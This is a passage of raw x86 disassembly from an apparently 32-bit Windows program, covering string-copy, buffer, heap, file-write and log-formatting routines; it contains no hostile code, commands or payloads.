  405443:	mov    esi,0x7ffffffe
  405448:	sub    eax,ecx
  40544a:	test   esi,esi
  40544c:	je     0x40545e
  40544e:	mov    bl,BYTE PTR [eax+ecx*1]
  405451:	test   bl,bl
  405453:	je     0x40545e
  405455:	mov    BYTE PTR [ecx],bl
  405457:	inc    ecx
  405458:	dec    esi
  405459:	sub    edx,0x1
  40545c:	jne    0x40544a
  40545e:	pop    esi
  40545f:	pop    ebx
  405460:	test   edx,edx
  405462:	jne    0x40546a
  405464:	dec    ecx
  405465:	mov    edi,0x80000005
  40546a:	mov    eax,edi
  40546c:	mov    BYTE PTR [ecx],0x0
  40546f:	pop    edi
  405470:	pop    ebp
  405471:	ret    0xc
  405474:	int3   
  405475:	int3   
  405476:	int3   
  405477:	int3   
  405478:	int3   
  405479:	mov    edi,edi
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	push   ebx
  40547f:	push   esi
  405480:	push   edi
  405481:	push   DWORD PTR [ebp+0x10]
  405484:	lea    esi,[edx-0x1]
  405487:	mov    edi,ecx
  405489:	push   DWORD PTR [ebp+0xc]
  40548c:	xor    ebx,ebx
  40548e:	push   esi
  40548f:	push   edi
  405490:	call   DWORD PTR ds:0x40a15c
  405496:	add    esp,0x10
  405499:	test   eax,eax
  40549b:	js     0x4054a8
  40549d:	cmp    eax,esi
  40549f:	ja     0x4054a8
  4054a1:	jne    0x4054b0
  4054a3:	mov    BYTE PTR [esi+edi*1],bl
  4054a6:	jmp    0x4054b0
  4054a8:	mov    BYTE PTR [esi+edi*1],bl
  4054ab:	mov    ebx,0x80000005
  4054b0:	pop    edi
  4054b1:	pop    esi
  4054b2:	mov    eax,ebx
  4054b4:	pop    ebx
  4054b5:	pop    ebp
  4054b6:	ret    0xc
  4054b9:	int3   
  4054ba:	int3   
  4054bb:	int3   
  4054bc:	int3   
  4054bd:	int3   
  4054be:	mov    edi,edi
  4054c0:	push   ebp
  4054c1:	mov    ebp,esp
  4054c3:	push   ecx
  4054c4:	push   ecx
  4054c5:	push   esi
  4054c6:	xor    esi,esi
  4054c8:	cmp    BYTE PTR ds:0x4093ac,0x0
  4054cf:	push   edi
  4054d0:	mov    edi,esi
  4054d2:	mov    DWORD PTR [ebp-0x8],esi
  4054d5:	mov    DWORD PTR [ebp-0x4],edi
  4054d8:	je     0x4054e2
  4054da:	mov    esi,DWORD PTR ds:0x4093b0
  4054e0:	jmp    0x405502
  4054e2:	sub    esp,0xc
  4054e5:	lea    ecx,[ebp-0x4]
  4054e8:	call   0x406e3c
  4054ed:	mov    edi,DWORD PTR [ebp-0x4]
  4054f0:	test   eax,eax
  4054f2:	js     0x405502
  4054f4:	push   ecx
  4054f5:	mov    edx,edi
  4054f7:	lea    ecx,[ebp-0x8]
  4054fa:	call   0x406d47
  4054ff:	mov    esi,DWORD PTR [ebp-0x8]
  405502:	mov    DWORD PTR ds:0x4093b0,esi
  405508:	mov    BYTE PTR ds:0x4093ac,0x1
  40550f:	test   edi,edi
  405511:	je     0x40551a
  405513:	push   edi
  405514:	call   DWORD PTR ds:0x40a184
  40551a:	pop    edi
  40551b:	mov    eax,esi
  40551d:	pop    esi
  40551e:	mov    esp,ebp
  405520:	pop    ebp
  405521:	ret    
  405522:	int3   
  405523:	int3   
  405524:	int3   
  405525:	int3   
  405526:	int3   
  405527:	mov    edi,edi
  405529:	push   ebp
  40552a:	mov    ebp,esp
  40552c:	push   ecx
  40552d:	push   ecx
  40552e:	push   esi
  40552f:	push   edi
  405530:	xor    edi,edi
  405532:	mov    DWORD PTR [ebp-0x4],edx
  405535:	mov    esi,ecx
  405537:	test   edx,edx
  405539:	je     0x4055c3
  40553f:	push   ebx
  405540:	cmp    edi,DWORD PTR [esi+0x4]
  405543:	jae    0x405580
  405545:	mov    ebx,DWORD PTR [esi+0x4]
  405548:	xor    eax,eax
  40554a:	mov    ecx,DWORD PTR [esi+0x14]
  40554d:	sub    ebx,edi
  40554f:	add    ecx,edi
  405551:	lea    edx,[ebx-0x1]
  405554:	mov    DWORD PTR [ebp-0x8],edx
  405557:	test   edx,edx
  405559:	mov    edx,DWORD PTR [ebp-0x4]
  40555c:	je     0x405578
  40555e:	cmp    BYTE PTR [eax+ecx*1],0xd
  405562:	jne    0x40556b
  405564:	cmp    BYTE PTR [eax+ecx*1+0x1],0xa
  405569:	je     0x405573
  40556b:	inc    eax
  40556c:	cmp    eax,DWORD PTR [ebp-0x8]
  40556f:	jb     0x40555e
  405571:	jmp    0x405578
  405573:	add    eax,0x2
  405576:	jne    0x40557a
  405578:	mov    eax,ebx
  40557a:	add    edi,eax
  40557c:	cmp    edi,edx
  40557e:	jb     0x405540
  405580:	pop    ebx
  405581:	cmp    edi,DWORD PTR [esi+0x8]
  405584:	jae    0x4055af
  405586:	cmp    edi,DWORD PTR [esi+0x4]
  405589:	jae    0x4055af
  40558b:	mov    ecx,DWORD PTR [esi+0x14]
  40558e:	mov    eax,DWORD PTR [esi+0x10]
  405591:	sub    eax,edi
  405593:	push   eax
  405594:	lea    eax,[ecx+edi*1]
  405597:	push   eax
  405598:	push   ecx
  405599:	call   DWORD PTR ds:0x40a154
  40559f:	mov    eax,DWORD PTR [esi+0x10]
  4055a2:	add    esp,0xc
  4055a5:	sub    eax,edi
  4055a7:	mov    DWORD PTR [esi+0x4],eax
  4055aa:	mov    DWORD PTR [esi+0x10],eax
  4055ad:	jmp    0x4055c3
  4055af:	push   DWORD PTR [esi+0x8]
  4055b2:	push   0x0
  4055b4:	push   DWORD PTR [esi+0x14]
  4055b7:	call   0x407abc
  4055bc:	add    esp,0xc
  4055bf:	and    DWORD PTR [esi+0x10],0x0
  4055c3:	pop    edi
  4055c4:	pop    esi
  4055c5:	mov    esp,ebp
  4055c7:	pop    ebp
  4055c8:	ret    
  4055c9:	int3   
  4055ca:	int3   
  4055cb:	int3   
  4055cc:	int3   
  4055cd:	int3   
  4055ce:	mov    edi,edi
  4055d0:	push   ebp
  4055d1:	mov    ebp,esp
  4055d3:	push   ecx
  4055d4:	push   esi
  4055d5:	xor    eax,eax
  4055d7:	mov    esi,edx
  4055d9:	cmp    BYTE PTR [ebp+0xc],al
  4055dc:	push   edi
  4055dd:	push   0x0
  4055df:	setne  al
  4055e2:	dec    eax
  4055e3:	and    eax,0x80000000
  4055e8:	push   eax
  4055e9:	push   0x4
  4055eb:	push   0x0
  4055ed:	push   0x1
  4055ef:	push   0x4
  4055f1:	push   ecx
  4055f2:	call   DWORD PTR ds:0x40a064
  4055f8:	mov    edi,eax
  4055fa:	cmp    edi,0xffffffff
  4055fd:	jne    0x405606
  4055ff:	mov    esi,0xc0000022
  405604:	jmp    0x405630
  405606:	push   0x0
  405608:	lea    eax,[ebp-0x4]
  40560b:	push   eax
  40560c:	push   DWORD PTR [ebp+0x8]
  40560f:	push   esi
  405610:	push   edi
  405611:	call   DWORD PTR ds:0x40a06c
  405617:	mov    esi,eax
  405619:	neg    esi
  40561b:	sbb    esi,esi
  40561d:	and    esi,0x3fffffde
  405623:	add    esi,0xc0000022
  405629:	push   edi
  40562a:	call   DWORD PTR ds:0x40a058
  405630:	pop    edi
  405631:	mov    eax,esi
  405633:	pop    esi
  405634:	mov    esp,ebp
  405636:	pop    ebp
  405637:	ret    0x8
  40563a:	int3   
  40563b:	int3   
  40563c:	int3   
  40563d:	int3   
  40563e:	int3   
  40563f:	mov    edi,edi
  405641:	push   ebp
  405642:	mov    ebp,esp
  405644:	sub    esp,0x20c
  40564a:	mov    eax,ds:0x409004
  40564f:	xor    eax,ebp
  405651:	mov    DWORD PTR [ebp-0x4],eax
  405654:	mov    eax,fs:0x30
  40565a:	and    DWORD PTR ds:0x4093a4,0x0
  405661:	push   ebx
  405662:	push   esi
  405663:	push   0x2a0
  405668:	push   0x8
  40566a:	push   DWORD PTR [eax+0x18]
  40566d:	call   DWORD PTR ds:0x40a1b8
  405673:	mov    esi,eax
  405675:	test   esi,esi
  405677:	jne    0x405683
  405679:	mov    ebx,0xc0000017
  40567e:	jmp    0x4057b5
  405683:	push   edi
  405684:	lea    eax,[esi+0x60]
  405687:	push   eax
  405688:	call   DWORD PTR ds:0x40a194
  40568e:	mov    eax,fs:0x30
  405694:	lea    edi,[esi+0x78]
  405697:	push   0x6
  405699:	pop    ecx
  40569a:	mov    ebx,DWORD PTR [eax+0x18]
  40569d:	xor    eax,eax
  40569f:	rep stos DWORD PTR es:[edi],eax
  4056a1:	test   ebx,ebx
  4056a3:	jne    0x4056ae
  4056a5:	mov    eax,fs:0x30
  4056ab:	mov    ebx,DWORD PTR [eax+0x18]
  4056ae:	mov    DWORD PTR [esi+0x78],ebx
  4056b1:	mov    edi,0x1000
  4056b6:	xor    ebx,ebx
  4056b8:	mov    DWORD PTR [esi+0x84],edi
  4056be:	mov    DWORD PTR [esi+0x7c],ebx
  4056c1:	mov    DWORD PTR [esi+0x80],ebx
  4056c7:	mov    DWORD PTR [esi+0x88],ebx
  4056cd:	mov    DWORD PTR [esi+0x8c],ebx
  4056d3:	lea    eax,[esi+0x298]
  4056d9:	push   eax
  4056da:	push   ebx
  4056db:	push   ebx
  4056dc:	push   0x401100
  4056e1:	call   DWORD PTR ds:0x40a17c
  4056e7:	push   0x104
  4056ec:	lea    eax,[ebp-0x20c]
  4056f2:	push   eax
  4056f3:	push   ebx
  4056f4:	call   DWORD PTR ds:0x40a068
  4056fa:	call   0x406f3c
  4056ff:	test   eax,eax
  405701:	je     0x40570d
  405703:	mov    ebx,0xc0000001
  405708:	jmp    0x4057a9
  40570d:	lea    eax,[ebp-0x20c]
  405713:	push   0x5c
  405715:	push   eax
  405716:	call   DWORD PTR ds:0x40a158
  40571c:	mov    ebx,eax
  40571e:	pop    ecx
  40571f:	pop    ecx
  405720:	test   ebx,ebx
  405722:	jne    0x40572c
  405724:	lea    ebx,[ebp-0x20c]
  40572a:	jmp    0x40572f
  40572c:	add    ebx,0x2
  40572f:	call   0x406f54
  405734:	push   eax
  405735:	push   ebx
  405736:	push   0x401520
  40573b:	push   0x7ffe0030
  405740:	push   0x402410
  405745:	lea    eax,[esi+0x90]
  40574b:	push   0x104
  405750:	push   eax
  405751:	call   0x4053c6
  405756:	mov    ebx,eax
  405758:	add    esp,0x1c
  40575b:	test   ebx,ebx
  40575d:	js     0x4057a9
  40575f:	lea    eax,[esi+0x4]
  405762:	mov    DWORD PTR [esi],eax
  405764:	call   0x4054be
  405769:	mov    ecx,DWORD PTR [esi]
  40576b:	push   ecx
  40576c:	push   0x401520
  405771:	push   ecx
  405772:	push   0x40
  405774:	mov    DWORD PTR [ecx+0x50],eax
  405777:	mov    ecx,DWORD PTR [esi]
  405779:	pop    edx
  40577a:	call   0x405432
  40577f:	mov    eax,DWORD PTR [esi+0x80]
  405785:	cmp    eax,edi
  405787:	jbe    0x40578f
  405789:	mov    edi,eax
  40578b:	test   eax,eax
  40578d:	je     0x40579f
  40578f:	lea    eax,[edi-0x1]
  405792:	not    eax
  405794:	and    eax,edi
  405796:	cmp    edi,eax
  405798:	jne    0x40579f
  40579a:	mov    eax,DWORD PTR [esi]
  40579c:	mov    DWORD PTR [eax+0x4c],edi
  40579f:	xor    ebx,ebx
  4057a1:	mov    DWORD PTR ds:0x4093a4,esi
  4057a7:	xor    esi,esi
  4057a9:	pop    edi
  4057aa:	test   esi,esi
  4057ac:	je     0x4057b5
  4057ae:	mov    ecx,esi
  4057b0:	call   0x4057ce
  4057b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4057b8:	mov    eax,ebx
  4057ba:	pop    esi
  4057bb:	xor    ecx,ebp
  4057bd:	pop    ebx
  4057be:	call   0x407330
  4057c3:	mov    esp,ebp
  4057c5:	pop    ebp
  4057c6:	ret    0x4
  4057c9:	int3   
  4057ca:	int3   
  4057cb:	int3   
  4057cc:	int3   
  4057cd:	int3   
  4057ce:	mov    edi,edi
  4057d0:	push   esi
  4057d1:	mov    esi,ecx
  4057d3:	test   esi,esi
  4057d5:	je     0x40583f
  4057d7:	push   edi
  4057d8:	lea    edi,[esi+0x78]
  4057db:	cmp    DWORD PTR [edi+0x14],0x0
  4057df:	je     0x4057ee
  4057e1:	push   DWORD PTR [edi+0x14]
  4057e4:	push   0x0
  4057e6:	push   DWORD PTR [edi]
  4057e8:	call   DWORD PTR ds:0x40a170
  4057ee:	push   0x6
  4057f0:	pop    ecx
  4057f1:	xor    eax,eax
  4057f3:	rep stos DWORD PTR es:[edi],eax
  4057f5:	lea    eax,[esi+0x60]
  4057f8:	push   eax
  4057f9:	call   DWORD PTR ds:0x40a18c
  4057ff:	cmp    DWORD PTR [esi],0x0
  405802:	pop    edi
  405803:	je     0x405813
  405805:	push   0x5c
  405807:	push   0x0
  405809:	push   DWORD PTR [esi]
  40580b:	call   0x407abc
  405810:	add    esp,0xc
  405813:	mov    ecx,DWORD PTR [esi+0x298]
  405819:	mov    eax,ecx
  40581b:	mov    edx,DWORD PTR [esi+0x29c]
  405821:	or     eax,edx
  405823:	je     0x40582d
  405825:	push   edx
  405826:	push   ecx
  405827:	call   DWORD PTR ds:0x40a188
  40582d:	mov    ecx,DWORD PTR fs:0x30
  405834:	mov    edx,esi
  405836:	pop    esi
  405837:	mov    ecx,DWORD PTR [ecx+0x18]
  40583a:	jmp    0x406c89
  40583f:	pop    esi
  405840:	ret    
  405841:	int3   
  405842:	int3   
  405843:	int3   
  405844:	int3   
  405845:	int3   
  405846:	mov    edi,edi
  405848:	push   ebp
  405849:	mov    ebp,esp
  40584b:	sub    esp,0xc
  40584e:	push   ebx
  40584f:	push   esi
  405850:	mov    esi,ecx
  405852:	mov    DWORD PTR [ebp-0x4],edx
  405855:	push   edi
  405856:	mov    edi,DWORD PTR [ebp+0x8]
  405859:	mov    ebx,edx
  40585b:	mov    eax,DWORD PTR [esi]
  40585d:	mov    DWORD PTR [eax+0x40],0x0
  405864:	mov    DWORD PTR [eax+0x44],0x0
  40586b:	lea    eax,[esi+0x60]
  40586e:	push   eax
  40586f:	call   DWORD PTR ds:0x40a1bc
  405875:	mov    eax,DWORD PTR [esi]
  405877:	mov    edx,DWORD PTR [esi+0x7c]
  40587a:	mov    ecx,DWORD PTR [eax+0x4c]
  40587d:	test   ecx,ecx
  40587f:	je     0x40589e
  405881:	cmp    edi,ecx
  405883:	jbe    0x40588b
  405885:	sub    ebx,ecx
  405887:	add    ebx,edi
  405889:	mov    edi,ecx
  40588b:	lea    eax,[edx+edi*1]
  40588e:	cmp    eax,ecx
  405890:	jbe    0x40589e
  405892:	sub    edx,ecx
  405894:	lea    ecx,[esi+0x78]
  405897:	add    edx,edi
  405899:	call   0x405527
  40589e:	test   edi,edi
  4058a0:	je     0x405965
  4058a6:	mov    eax,DWORD PTR [esi+0x88]
  4058ac:	lea    ecx,[eax+edi*1]
  4058af:	cmp    ecx,eax
  4058b1:	jb     0x405965
  4058b7:	cmp    ecx,DWORD PTR [esi+0x80]
  4058bd:	jbe    0x405926
  4058bf:	mov    edx,DWORD PTR [esi+0x84]
  4058c5:	dec    edx
  4058c6:	lea    eax,[edx+ecx*1]
  4058c9:	cmp    eax,ecx
  4058cb:	jb     0x405965
  4058d1:	mov    ecx,DWORD PTR [esi+0x8c]
  4058d7:	not    edx
  4058d9:	and    eax,edx
  4058db:	mov    DWORD PTR [ebp-0x8],eax
  4058de:	push   eax
  4058df:	test   ecx,ecx
  4058e1:	jne    0x405907
  4058e3:	push   ecx
  4058e4:	push   DWORD PTR [esi+0x78]
  4058e7:	call   DWORD PTR ds:0x40a1b8
  4058ed:	mov    DWORD PTR [ebp-0xc],eax
  4058f0:	test   eax,eax
  4058f2:	je     0x405965
  4058f4:	push   DWORD PTR [ebp-0x8]
  4058f7:	push   0x0
  4058f9:	push   eax
  4058fa:	call   0x407abc
  4058ff:	mov    eax,DWORD PTR [ebp-0xc]
  405902:	add    esp,0xc
  405905:	jmp    0x405913
  405907:	push   ecx
  405908:	push   0x0
  40590a:	push   DWORD PTR [esi+0x78]
  40590d:	call   DWORD PTR ds:0x40a180
  405913:	test   eax,eax
  405915:	je     0x405965
  405917:	mov    DWORD PTR [esi+0x8c],eax
  40591d:	mov    eax,DWORD PTR [ebp-0x8]
  405920:	mov    DWORD PTR [esi+0x80],eax
  405926:	mov    eax,DWORD PTR [esi+0x8c]
  40592c:	add    eax,DWORD PTR [esi+0x88]
  405932:	push   edi
  405933:	push   ebx
  405934:	push   eax
  405935:	call   0x407ab0
  40593a:	mov    eax,DWORD PTR [esi+0x88]
  405940:	add    esp,0xc
  405943:	lea    ecx,[eax+edi*1]
  405946:	cmp    ecx,eax
  405948:	jb     0x40595e
  40594a:	mov    DWORD PTR [esi+0x88],ecx
  405950:	mov    eax,DWORD PTR [esi+0x7c]
  405953:	cmp    eax,ecx
  405955:	ja     0x405959
  405957:	mov    eax,ecx
  405959:	mov    DWORD PTR [esi+0x7c],eax
  40595c:	jmp    0x405965
  40595e:	or     DWORD PTR [esi+0x88],0xffffffff
  405965:	lea    edi,[esi+0x60]
  405968:	push   edi
  405969:	call   DWORD PTR ds:0x40a190
  40596f:	mov    ecx,DWORD PTR [esi]
  405971:	mov    eax,DWORD PTR [esi+0x8c]
  405977:	mov    ebx,DWORD PTR [ebp-0x4]
  40597a:	cdq    
  40597b:	mov    DWORD PTR [ecx+0x40],eax
  40597e:	mov    DWORD PTR [ecx+0x44],edx
  405981:	mov    ecx,DWORD PTR [esi]
  405983:	mov    eax,DWORD PTR [esi+0x7c]
  405986:	mov    DWORD PTR [ecx+0x48],eax
  405989:	mov    eax,DWORD PTR [esi]
  40598b:	test   BYTE PTR [eax+0x50],0x1
  40598f:	je     0x405998
  405991:	push   ebx
  405992:	call   DWORD PTR ds:0x40a05c
  405998:	mov    eax,DWORD PTR [esi]
  40599a:	test   BYTE PTR [eax+0x50],0x4
  40599e:	je     0x4059cc
  4059a0:	push   edi
  4059a1:	call   DWORD PTR ds:0x40a1bc
  4059a7:	mov    eax,DWORD PTR [esi]
  4059a9:	lea    ecx,[esi+0x90]
  4059af:	mov    edx,ebx
  4059b1:	mov    eax,DWORD PTR [eax+0x50]
  4059b4:	shr    eax,0x3
  4059b7:	and    al,0x1
  4059b9:	movzx  eax,al
  4059bc:	push   eax
  4059bd:	push   DWORD PTR [ebp+0x8]
  4059c0:	call   0x4055ce
  4059c5:	push   edi
  4059c6:	call   DWORD PTR ds:0x40a190
  4059cc:	pop    edi
  4059cd:	pop    esi
  4059ce:	pop    ebx
  4059cf:	mov    esp,ebp
  4059d1:	pop    ebp
  4059d2:	ret    0x4
  4059d5:	int3   
  4059d6:	int3   
  4059d7:	int3   
  4059d8:	int3   
  4059d9:	int3   
  4059da:	mov    edi,edi
  4059dc:	push   ebp
  4059dd:	mov    ebp,esp
  4059df:	sub    esp,0x14
  4059e2:	mov    eax,ds:0x409004
  4059e7:	xor    eax,ebp
  4059e9:	mov    DWORD PTR [ebp-0x4],eax
  4059ec:	push   esi
  4059ed:	mov    esi,DWORD PTR [ecx+0x298]
  4059f3:	mov    eax,esi
  4059f5:	mov    ecx,DWORD PTR [ecx+0x29c]
  4059fb:	or     eax,ecx
  4059fd:	je     0x405a3e
  4059ff:	mov    eax,DWORD PTR [ebp+0x8]
  405a02:	and    DWORD PTR [ebp-0x10],0x0
  405a06:	and    DWORD PTR [ebp-0x8],0x0
  405a0a:	mov    DWORD PTR [ebp-0x14],eax
  405a0d:	mov    eax,DWORD PTR [ebp+0xc]
  405a10:	inc    eax
  405a11:	mov    DWORD PTR [ebp-0xc],eax
  405a14:	sub    edx,0x1
  405a17:	je     0x405a2b
  405a19:	sub    edx,0x1
  405a1c:	jne    0x405a3e
  405a1e:	lea    eax,[ebp-0x14]
  405a21:	push   eax
  405a22:	push   0x1
  405a24:	push   0x4014e0
  405a29:	jmp    0x405a36
  405a2b:	lea    eax,[ebp-0x14]
  405a2e:	push   eax
  405a2f:	push   0x1
  405a31:	push   0x4010f0
  405a36:	push   ecx
  405a37:	push   esi
  405a38:	call   DWORD PTR ds:0x40a198
  405a3e:	mov    ecx,DWORD PTR [ebp-0x4]
  405a41:	xor    ecx,ebp
  405a43:	pop    esi
  405a44:	call   0x407330
  405a49:	mov    esp,ebp
  405a4b:	pop    ebp
  405a4c:	ret    0x8
  405a4f:	int3   
  405a50:	int3   
  405a51:	int3   
  405a52:	int3   
  405a53:	int3   
  405a54:	mov    edi,edi
  405a56:	push   esi
  405a57:	xor    eax,eax
  405a59:	mov    esi,eax
  405a5b:	push   edi
  405a5c:	mov    edi,ecx
  405a5e:	test   edx,edx
  405a60:	je     0x405a87
  405a62:	mov    cl,BYTE PTR [esi+edi*1]
  405a65:	test   cl,cl
  405a67:	je     0x405a87
  405a69:	cmp    cl,0xa
  405a6c:	je     0x405a7e
  405a6e:	cmp    cl,0xd
  405a71:	je     0x405a7e
  405a73:	cmp    cl,0x2c
  405a76:	jne    0x405a82
  405a78:	mov    BYTE PTR [esi+edi*1],0x5f
  405a7c:	jmp    0x405a82
  405a7e:	mov    BYTE PTR [esi+edi*1],0x23
  405a82:	inc    esi
  405a83:	cmp    esi,edx
  405a85:	jb     0x405a62
  405a87:	mov    ecx,eax
  405a89:	test   edx,edx
  405a8b:	je     0x405a95
  405a8d:	cmp    edx,0x7fffffff
  405a93:	jbe    0x405a9a
  405a95:	mov    ecx,0xc000000d
  405a9a:	test   ecx,ecx
  405a9c:	js     0x405ad8
  405a9e:	mov    esi,edx
  405aa0:	mov    ecx,eax
  405aa2:	push   ebx
  405aa3:	mov    ebx,edi
  405aa5:	test   edx,edx
  405aa7:	je     0x405abd
  405aa9:	cmp    BYTE PTR [ebx],al
  405aab:	je     0x405ab3
  405aad:	inc    ebx
  405aae:	sub    esi,0x1
  405ab1:	jne    0x405aa9
  405ab3:	test   esi,esi
  405ab5:	je     0x405abd
  405ab7:	mov    eax,edx
  405ab9:	sub    eax,esi
  405abb:	jmp    0x405ac2
  405abd:	mov    ecx,0xc000000d
  405ac2:	pop    ebx
  405ac3:	test   ecx,ecx
  405ac5:	js     0x405ad8
  405ac7:	push   ecx
  405ac8:	push   0x402448
  405acd:	push   ecx
  405ace:	sub    edx,eax
  405ad0:	lea    ecx,[eax+edi*1]
  405ad3:	call   0x405432
  405ad8:	pop    edi
  405ad9:	pop    esi
  405ada:	ret    
  405adb:	int3   
  405adc:	int3   
  405add:	int3   
  405ade:	int3   
  405adf:	int3   
  405ae0:	mov    edi,edi
  405ae2:	push   ebp
  405ae3:	mov    ebp,esp
  405ae5:	sub    esp,0x41c
  405aeb:	mov    eax,ds:0x409004
  405af0:	xor    eax,ebp
  405af2:	mov    DWORD PTR [ebp-0x4],eax
  405af5:	mov    eax,DWORD PTR [ebp+0x10]
  405af8:	push   ebx
  405af9:	push   esi
  405afa:	mov    esi,DWORD PTR [ebp+0x8]
  405afd:	mov    ebx,ecx
  405aff:	mov    DWORD PTR [ebp-0x41c],eax
  405b05:	mov    eax,DWORD PTR [ebp+0x14]
  405b08:	mov    DWORD PTR [ebp-0x414],eax
  405b0e:	push   edi
  405b0f:	mov    edi,edx
  405b11:	test   ebx,ebx
  405b13:	je     0x405c61
  405b19:	call   0x406f3c
  405b1e:	mov    DWORD PTR [ebp-0x418],eax
  405b24:	xor    eax,eax
  405b26:	mov    DWORD PTR [ebp-0x410],eax
  405b2c:	mov    BYTE PTR [ebp-0x404],al
  405b32:	cmp    edi,0x3
  405b35:	jne    0x405b3f
  405b37:	mov    ecx,DWORD PTR [ebx]
  405b39:	test   BYTE PTR [ecx+0x50],0x10
  405b3d:	je     0x405b46
  405b3f:	mov    BYTE PTR [ebp-0x410],0x1
  405b46:	cmp    edi,0x1
  405b49:	sete   BYTE PTR [ebp-0x405]
  405b50:	cmp    edi,0x3
  405b53:	jl     0x405b58
  405b55:	push   0x3
  405b57:	pop    edi
  405b58:	test   esi,esi
  405b5a:	jne    0x405b61
  405b5c:	mov    esi,0x40235f
  405b61:	mov    eax,DWORD PTR [ebp+0xc]
  405b64:	inc    eax
  405b65:	neg    eax
  405b67:	sbb    eax,eax
  405b69:	and    eax,DWORD PTR [ebp+0xc]
  405b6c:	push   eax
  405b6d:	push   esi
  405b6e:	push   DWORD PTR [edi*8+0x402488]
  405b75:	mov    esi,0x3fe
  405b7a:	lea    eax,[ebp-0x404]
  405b80:	push   0x40244c
  405b85:	push   esi
  405b86:	push   eax
  405b87:	call   0x40537f
  405b8c:	add    esp,0x18
  405b8f:	test   eax,eax
  405b91:	jns    0x405ba5
  405b93:	push   0x402458
  405b98:	mov    edx,esi
  405b9a:	lea    ecx,[ebp-0x404]
  405ba0:	call   0x40530d
  405ba5:	lea    ecx,[ebp-0x404]
  405bab:	lea    edx,[ecx+0x1]
  405bae:	mov    al,BYTE PTR [ecx]
  405bb0:	inc    ecx
  405bb1:	test   al,al
  405bb3:	jne    0x405bae
  405bb5:	push   DWORD PTR [ebp-0x414]
  405bbb:	sub    ecx,edx
  405bbd:	lea    eax,[ebp-0x404]
  405bc3:	push   DWORD PTR [ebp-0x41c]
  405bc9:	add    eax,ecx
  405bcb:	sub    esi,ecx
  405bcd:	mov    edx,esi
  405bcf:	mov    DWORD PTR [ebp-0x40c],eax
  405bd5:	mov    ecx,eax
  405bd7:	call   0x405345
  405bdc:	test   eax,eax
  405bde:	jns    0x405bf2
  405be0:	mov    ecx,DWORD PTR [ebp-0x40c]
  405be6:	mov    edx,esi
  405be8:	push   0x402470
  405bed:	call   0x40530d
  405bf2:	mov    ecx,DWORD PTR [ebp-0x40c]
  405bf8:	lea    edx,[esi+0x2]
  405bfb:	call   0x405a54
  405c00:	lea    esi,[ebp-0x404]
  405c06:	lea    ecx,[esi+0x1]
  405c09:	mov    al,BYTE PTR [esi]
  405c0b:	inc    esi
  405c0c:	test   al,al
  405c0e:	jne    0x405c09
  405c10:	sub    esi,ecx
  405c12:	cmp    BYTE PTR [ebp-0x410],al
  405c18:	je     0x405c28
  405c1a:	push   esi
  405c1b:	lea    edx,[ebp-0x404]
  405c21:	mov    ecx,ebx
  405c23:	call   0x405846
  405c28:	cmp    BYTE PTR [ebp-0x405],0x0
  405c2f:	je     0x405c42
  405c31:	push   esi
  405c32:	lea    eax,[ebp-0x404]
  405c38:	mov    edx,edi
  405c3a:	push   eax
  405c3b:	mov    ecx,ebx
  405c3d:	call   0x4059da
  405c42:	push   DWORD PTR [ebp-0x418]
  405c48:	call   DWORD PTR ds:0x40a060
  405c4e:	cmp    edi,0x1
  405c51:	jne    0x405c61
  405c53:	mov    eax,DWORD PTR [ebx]
  405c55:	test   BYTE PTR [eax+0x50],0x2
  405c59:	je     0x405c61
  405c5b:	call   DWORD PTR ds:0x40a054
  405c61:	mov    ecx,DWORD PTR [ebp-0x4]
  405c64:	pop    edi
  405c65:	pop    esi
  405c66:	xor    ecx,ebp
  405c68:	pop    ebx
  405c69:	call   0x407330
  405c6e:	mov    esp,ebp
  405c70:	pop    ebp
  405c71:	ret    0x10
  405c74:	int3   
  405c75:	int3   
  405c76:	int3   
  405c77:	int3   
  405c78:	int3   
  405c79:	mov    edi,edi
  405c7b:	push   ebp
  405c7c:	mov    ebp,esp
  405c7e:	mov    eax,ecx
  405c80:	xor    ecx,ecx
  405c82:	mul    edx
  405c84:	push   esi
  405c85:	mov    esi,eax
  405c87:	cmp    edx,ecx
  405c89:	ja     0x405c99
  405c8b:	jb     0x405c92
  405c8d:	cmp    esi,0xffffffff
  405c90:	ja     0x405c99
  405c92:	mov    eax,DWORD PTR [ebp+0x8]
  405c95:	mov    DWORD PTR [eax],esi
  405c97:	jmp    0x405ca4
  405c99:	mov    eax,DWORD PTR [ebp+0x8]
  405c9c:	mov    ecx,0x80070216
  405ca1:	or     DWORD PTR [eax],0xffffffff
  405ca4:	mov    eax,ecx
  405ca6:	pop    esi
  405ca7:	pop    ebp
  405ca8:	ret    0x4
  405cab:	int3   
  405cac:	int3   
  405cad:	int3   
  405cae:	int3   
  405caf:	int3   
  405cb0:	mov    edi,edi
  405cb2:	push   edi
  405cb3:	mov    edi,ecx
  405cb5:	cmp    DWORD PTR [edi+0x14],0x0
  405cb9:	je     0x405cc8
  405cbb:	push   DWORD PTR [edi+0x14]
  405cbe:	push   0x0
  405cc0:	push   DWORD PTR [edi]
  405cc2:	call   DWORD PTR ds:0x40a170
  405cc8:	push   0x6
  405cca:	pop    ecx
  405ccb:	xor    eax,eax
  405ccd:	rep stos DWORD PTR es:[edi],eax
  405ccf:	pop    edi
  405cd0:	ret    
  405cd1:	int3   
  405cd2:	int3   
  405cd3:	int3   
  405cd4:	int3   
  405cd5:	int3   
  405cd6:	mov    edi,edi
  405cd8:	push   ebp
  405cd9:	mov    ebp,esp
  405cdb:	push   ecx
  405cdc:	push   ecx
  405cdd:	cmp    DWORD PTR [ebp+0xc],0x0
  405ce1:	push   ebx
  405ce2:	push   esi
  405ce3:	push   edi
  405ce4:	mov    esi,ecx
  405ce6:	je     0x405d0f
  405ce8:	mov    ecx,DWORD PTR [ebp+0xc]
  405ceb:	lea    edx,[ecx+0x1]
  405cee:	mov    al,BYTE PTR [ecx]
  405cf0:	inc    ecx
  405cf1:	test   al,al
  405cf3:	jne    0x405cee
  405cf5:	xor    edi,edi
  405cf7:	sub    ecx,edx
  405cf9:	inc    edi
  405cfa:	cmp    ecx,edi
  405cfc:	jb     0x405d11
  405cfe:	mov    edi,DWORD PTR [ebp+0xc]
  405d01:	lea    ecx,[edi+0x1]
  405d04:	mov    al,BYTE PTR [edi]
  405d06:	inc    edi
  405d07:	test   al,al
  405d09:	jne    0x405d04
  405d0b:	sub    edi,ecx
  405d0d:	jmp    0x405d11
  405d0f:	xor    edi,edi
  405d11:	cmp    DWORD PTR [ebp+0x8],0x0
  405d15:	je     0x405d28
